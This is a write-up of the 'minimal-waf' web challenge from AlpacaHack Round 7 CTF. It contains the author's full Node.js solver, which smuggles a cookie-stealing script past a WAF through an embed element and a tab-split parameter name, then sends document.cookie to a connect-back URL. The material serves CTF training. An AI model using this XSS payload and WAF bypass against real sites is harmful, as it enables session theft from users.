---
title: "Minimal Waf - AlpacaHack Round 7 2024"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "minimal", "waf", "web", "alpacahack-round-7"]
summary: "Note: Don't forget that the target host is localhost from the admin bot."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_AlpacaHack_Round_7/web/minimal-waf"
license: "none stated"
ctf:
  name: "AlpacaHack Round 7"
  year: 2024
  challenge: "Minimal Waf"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_AlpacaHack_Round_7/web/minimal-waf>
- **CTF:** AlpacaHack Round 7 2024

---

# [web] minimal-waf

## Description

Here is a minimal WAF!

Note: Don't forget that the target host is **localhost** from the admin bot.

## Attachments

- [minimal-waf](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_AlpacaHack_Round_7/web/minimal-waf/solution/index.js>

```javascript
const app = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const innerHtml = `<script>navigator.sendBeacon("${CONNECTBACK_URL}", document.cookie)</script>`;

const encode = (s) =>
  [...s]
    .map((c) => "%" + c.codePointAt(0).toString(16).padStart(2, "0"))
    .join("");

const outerHtml = `<embed code="/view?h\ttml=${encode(
  innerHtml
)}" type=text/xml>`;

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(
    `http://localhost:3000/view?html=${encodeURIComponent(outerHtml)}`
  );

  await sleep(5 * 1000);
  fail("Failed");
});
```
